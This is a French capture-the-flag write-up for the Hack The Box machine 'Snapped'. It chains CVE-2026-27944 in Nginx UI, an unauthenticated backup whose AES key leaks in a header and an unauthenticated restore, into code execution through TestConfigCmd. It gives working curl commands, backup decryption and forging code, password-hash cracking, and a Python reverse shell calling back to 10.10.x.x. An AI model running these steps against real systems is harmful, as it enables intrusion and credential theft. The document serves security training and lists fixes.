# Snapped.htb Writeup

**Box** : Snapped | **OS** : Linux | **Difficulté** : Medium  
**Technique** : CVE-2026-27944 — Nginx UI Backup/Restore → RCE
**Auteur** : SOOBIK

---

## Sommaire

1. [Énumération](#1-énumération)
2. [Découverte de Nginx UI](#2-découverte-de-nginx-ui)
3. [CVE-2026-27944 — Backup non authentifié](#3-cve-2026-27944--backup-non-authentifié)
4. [Extraction des secrets](#4-extraction-des-secrets)
5. [Authentification API](#5-authentification-api)
6. [RCE via Restore + TestConfigCmd](#6-rce-via-restore--testconfigcmd)
7. [Reverse Shell](#7-reverse-shell)

---

## 1. Énumération

### Scan de ports

```bash
nmap -sC -sV -oN nmap/initial.nmap 10.129.x.x
nmap -p- -oN nmap/fullport.nmap 10.129.x.x
```

**Résultat** :
| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 80/tcp | HTTP | nginx 1.24.0 (Ubuntu) |

Seulement 2 ports ouverts : SSH et HTTP.

### Reconnaissance Web

```bash
curl -s http://10.129.x.x | grep -i title
# → "Snapped — Infrastructure. Orchestration. Control."

gobuster vhost -u http://10.129.x.x -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 50
```

Découverte du sous-domaine **admin.snapped.htb** qui exécute **Nginx UI** (Yet Another Nginx Web UI).

---

## 2. Nginx UI

Nginx UI est une interface web d'administration pour Nginx, écrite en Go/Vue.js.

**Version** : 2.3.2  
**Fonctionnalités** : gestion des sites nginx, certificats SSL, terminal web, backup/restore.

Analyse des endpoints API accessibles sans authentification :

```bash
# Backup non authentifié (la clé est dans la réponse)
curl -s -D - http://admin.snapped.htb/api/backup -o /dev/null
# → X-Backup-Security: <key>:<iv>

# Génération de clé RSA (login)
curl -s -X POST http://admin.snapped.htb/api/crypto/public_key \
  -H "Content-Type: application/json" \
  -d '{"timestamp": 1700000000000, "fingerprint": "test"}'
```

---

## 3. CVE-2026-27944 — Backup non authentifié

### Le bug

L'endpoint `GET /api/backup` n'est protégé par AUCUN middleware d'authentification.

```go
// Route : aucune auth
r.GET("/backup", CreateBackup)
```

Cette endpoint génère un ZIP contenant l'intégralité de la configuration Nginx UI :
- `app.ini` (JwtSecret, Node Secret, Crypto Secret, paramètres nginx)
- `database.db` (utilisateurs, hashs bcrypt, tokens)
- Configuration nginx complète

Les fichiers sont chiffrés en **AES-256-CBC** avec une **clé aléatoire**.

### La fuite

La clé AES et l'IV sont retournées dans le header HTTP **`X-Backup-Security`** :

```bash
X-Backup-Security: m8OqvrZQpQ4IS0nAdmQ5jfJGMbk2jRmV6Jb7RsF7W94=:0M7fUKlBdFxyVLBkJxShTw==
```

Format : `base64(key):base64(iv)`

### Déchiffrement

```python
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

key_b64, iv_b64 = backup_token.split(':')
key = base64.b64decode(key_b64)
iv = base64.b64decode(iv_b64)

cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
decryptor = cipher.decryptor()
decrypted = decryptor.update(encrypted_data) + decryptor.finalize()

# Supprimer le padding PKCS7
pad_len = decrypted[-1]
decrypted = decrypted[:-pad_len]
```

**Structure du ZIP** :
```
backup.zip
├── hash_info.txt    (chiffré AES) → métadonnées
├── nginx-ui.zip     (chiffré AES) → app.ini + database.db
└── nginx.zip        (chiffré AES) → config nginx
```

---

## 4. Extraction des secrets

### app.ini

| Section | Valeurs clés |
|---------|--------------|
| `[app]` | `JwtSecret = 6c4af436-035a-4942-9ca6-172b36696ce9` |
| `[node]` | `Secret = c64d7ca1-19cb-4ebe-96d4-49037e7df78e` |
| `[crypto]` | `Secret = d7ada37066379dad876ccc3797bc57ee4a75091825f72002ed48aec26279bccd` |
| `[database]` | `Path = /var/lib/nginx-ui/database.db` |
| `[nginx]` | `TestConfigCmd`, `ReloadCmd`, `RestartCmd` |

### database.db (SQLite)

Tables importantes :
- **users** : `admin` et `jonathan` avec hashs bcrypt
- **auth_tokens** : tokens JWT (vide après restart)
- **nodes** : nœuds cluster (vide)

```sql
-- users
id | name     | password (bcrypt)                                         | status
1  | admin    | $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm | 1
2  | jonathan | $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq | 1
```

Le hash de **jonathan** a été cracké avec `hashcat -m 3200` et `rockyou.txt` :

```
$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
```

### Nginx config

```nginx
# snapped.htb → serveur statique
server {
    listen 80 default_server;
    server_name snapped.htb;
    root /var/www/html/snapped;
}

# admin.snapped.htb → proxy vers Nginx UI
server {
    listen 80;
    server_name admin.snapped.htb;
    location / {
        proxy_pass http://127.0.0.1:9000;
    }
}
```

---

## 5. Authentification API

### Méthode 1 : X-Node-Secret

Le header `X-Node-Secret` est validé contre `settings.NodeSettings.Secret` (chargé du fichier `app.ini`) :

```go
// internal/middleware/middleware.go
if nodeSecret := getNodeSecret(c); nodeSecret != "" && nodeSecret == settings.NodeSettings.Secret {
    initUser := user.GetInitUser(c)
    c.Set("user", initUser)
    c.Next()
    return
}
```

```bash
curl -s http://admin.snapped.htb/api/settings \
  -H "X-Node-Secret: c64d7ca1-19cb-4ebe-96d4-49037e7df78e"
# → Accès complet à l'API
```

### Méthode 2 : JWT

Le JWT est signé en HS256 avec `JwtSecret`.  
Mais l'authentification vérifie aussi que le token existe dans la table `auth_tokens` de la BDD.

```go
// internal/user/user.go
claims := JWTClaims{Name: user.Name, UserID: user.ID, ...}
token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
signedToken, _ := token.SignedString([]byte(cSettings.AppSettings.JwtSecret))

// Stockage en BDD
authToken := &model.AuthToken{UserID: user.ID, Token: signedToken, ...}
query.AuthToken.Create(authToken)
```

Après un restart de Nginx UI, la table `auth_tokens` est vide → JWT inutilisable.  
**L'auth via X-Node-Secret reste fonctionnelle.**

---

## 6. RCE via Restore + TestConfigCmd

### Principe

**Deuxième bug** : l'endpoint `POST /api/restore` n'est pas authentifié non plus, et permet d'écrire des fichiers arbitraires sur le serveur.

```go
// Route : pas d'AuthRequired !
r.POST("/restore", middleware.EncryptedForm(), RestoreBackup)
```

**Fonctionnement du restore** :

1. Le serveur déchiffre le ZIP uploadé avec la clé AES fournie
2. Si `restore_nginx_ui=true` → copie `app.ini` sur le disque, puis redémarre Nginx UI
3. Si `restore_nginx=true` → copie les fichiers dans `/etc/nginx/`

**Le vecteur RCE** : le paramètre `TestConfigCmd` dans `app.ini` est exécuté à chaque `POST /api/nginx/test` :

```go
// internal/nginx/nginx.go
func TestConfig() (string, error) {
    if settings.NginxSettings.TestConfigCmd != "" {
        return execShell(settings.NginxSettings.TestConfigCmd)
        // → exec.Command("/bin/sh", "-c", cmd)
    }
    return execCommand("nginx", "-t")
}
```

### Contrainte #1 : le parser INI

Le parser `go-ini` traite le **point-virgule (`;`)** comme un début de commentaire inline.

```
TestConfigCmd = id ; ceci est un commentaire
```

→ Seule la commande `id` est exécutée, le reste est ignoré.

**Solution** : utiliser `&&` à la place de `;` pour chaîner les commandes :

```
TestConfigCmd = id && whoami && ls -la /home/
```

### Contrainte #2 : ProtectedFill

Le champ `TestConfigCmd` a le tag `protected:"true"` dans le code Go :

```go
TestConfigCmd string `json:"test_config_cmd" protected:"true"`
```

→ La modification via `POST /api/settings` est silencieusement ignorée.  
→ **Seule solution** : écraser le fichier `app.ini` sur le disque via le restore.

### Création du backup modifié

```python
import base64, zipfile, os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

cmd = "id && whoami && ls -la /home/"

app_ini = f"""
[server]
Host = 127.0.0.1
Port = 9000

[app]
JwtSecret = 6c4af436-035a-4942-9ca6-172b36696ce9

[nginx]
TestConfigCmd = {cmd}

[node]
Secret = c64d7ca1-19cb-4ebe-96d4-49037e7df78e
"""

# Écrire app.ini, compresser en nginx-ui.zip
# Créer hash_info.txt, nginx.zip placeholder
# Chiffrer les 3 fichiers avec AES-256-CBC
# Emballer le tout dans un ZIP final

key = os.urandom(32)
iv = os.urandom(16)
# ... (voir exploit.py pour l'implémentation complète)
```

### Restauration

```bash
curl -X POST http://admin.snapped.htb/api/restore \
  -F "backup_file=@backup.zip" \
  -F "security_token=<base64_key>:<base64_iv>" \
  -F "restore_nginx_ui=true" \
  -F "verify_hash=false"

# → 200 {"nginx_ui_restored": true, "nginx_restored": false, "hash_match": false}
```

Le restore déclenche un redémarrage de Nginx UI après 2 secondes.

### Déclenchement de la commande

```bash
curl -X POST http://admin.snapped.htb/api/nginx/test \
  -H "X-Node-Secret: c64d7ca1-19cb-4ebe-96d4-49037e7df78e" \
  -H "Content-Type: application/json" \
  -d '{"content": "test"}'

# → 200 {"level": -1, "message": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
```

**RCE confirmée** en tant que `www-data` (uid=33).

---

## 7. Reverse Shell

Une fois la RCE confirmée, on injecte un reverse shell Python :

```python
cmd = (
    "printf 'import socket,subprocess,os\\n"
    "s=socket.socket()\\n"
    "s.connect((\"10.10.x.x\",5555))\\n"
    "os.dup2(s.fileno(),0)\\n"
    "os.dup2(s.fileno(),1)\\n"
    "os.dup2(s.fileno(),2)\\n"
    "subprocess.call([\"/bin/bash\",\"-i\"])\\n' "
    "> /tmp/r.py && python3 /tmp/r.py &"
)
```

Le `printf` écrit un script Python dans `/tmp/r.py`, puis `python3` l'exécute en arrière-plan (`&`).

### Préparation du listener

```bash
# En utilisant penelope (ou n'importe quel listener)
penelope 10.10.x.x 5555
# ou
nc -lvnp 5555
```

### Injection

Même procédure que pour la RCE :
1. Créer un backup avec le reverse shell dans `TestConfigCmd`
2. Restaurer (redémarre Nginx UI)
3. Attendre 5-6 secondes
4. Déclencher via `POST /api/nginx/test`

```bash
www-data@snapped:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@snapped:/$ whoami
www-data
```

---

## Résumé des vulnérabilités

| # | Vulnérabilité | Endpoint | Impact |
|---|---------------|----------|--------|
| 1 | Backup sans auth | `GET /api/backup` | Fuite de tous les secrets |
| 2 | Fuite clé AES dans header | `X-Backup-Security` | Déchiffrement du backup |
| 3 | Restore sans auth | `POST /api/restore` | Écriture fichiers arbitraires |
| 4 | RCE via TestConfigCmd | `POST /api/nginx/test` | Exécution de commandes |

### Correctifs possibles

1. Ajouter `AuthRequired()` sur `/api/backup` et `/api/restore`
2. Ne pas exposer la clé AES dans les headers HTTP
3. Valider et restreindre les configurations restore
4. Supprimer ou restreindre `TestConfigCmd`

---

## Commandes utiles

```bash
# Backup
curl -s -D - http://admin.snapped.htb/api/backup -o backup.zip

# Restore
curl -X POST http://admin.snapped.htb/api/restore \
  -F "backup_file=@backup.zip" \
  -F "security_token=key:iv" \
  -F "restore_nginx_ui=true"

# RCE trigger
curl -X POST http://admin.snapped.htb/api/nginx/test \
  -H "X-Node-Secret: c64d7ca1-19cb-4ebe-96d4-49037e7df78e" \
  -H "Content-Type: application/json" \
  -d '{"content":"test"}'

# API settings (lecture)
curl -s http://admin.snapped.htb/api/settings \
  -H "X-Node-Secret: c64d7ca1-19cb-4ebe-96d4-49037e7df78e"
```
